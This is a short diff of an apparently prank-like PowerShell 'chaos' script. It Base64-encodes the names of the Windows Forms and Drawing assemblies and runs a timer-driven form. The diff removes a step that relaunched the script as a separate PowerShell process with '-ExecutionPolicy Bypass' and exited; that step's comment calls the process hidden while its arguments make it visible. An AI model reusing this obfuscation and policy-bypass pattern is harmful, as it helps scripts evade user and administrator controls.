@@ -1,5 +1,4 @@
-$chaos = {
-    # 1. Load Windows Forms and Drawing Assemblies
+ # 1. Load Windows Forms and Drawing Assemblies
     $formsName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLldpbmRvd3MuRm9ybXM='))
     $drawingName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLkRyYXdpbmc='))
     
@@ -60,9 +59,3 @@ $chaos = {
 
     $chaosTimer.Start()
     $mainForm.ShowDialog()
-}
-
-# THE DETACH STEP: 
-# Spawns the $chaos block as a new hidden process and immediately exits this window.
-Start-Process powershell -ArgumentList "-WindowStyle Visible", "-ExecutionPolicy Bypass", "-Command", $chaos.ToString()
-exit
